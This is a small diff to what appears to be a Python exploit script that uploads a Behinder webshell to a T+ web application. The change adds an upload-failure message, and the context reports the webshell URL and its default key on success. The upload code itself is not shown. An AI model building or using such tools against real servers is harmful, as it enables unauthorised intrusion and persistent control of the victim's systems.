@@ -56,7 +56,8 @@ def exp(exp_url):
             shell_url='目标+/tplus/index.aspx?preload=1'
             console.print(now_time() + ' [SUCCESS]  文件上传成功, 冰蝎默认明文密钥WebShell: {}'.format(shell_url),
                               style='bold green') 
-        
+        else:
+            console.print(now_time() + ' [WARNING]  文件上传失败', style='bold yellow')
     except:
         console.print(now_time() + ' [WARNING]  文件上传失败', style='bold yellow')
     
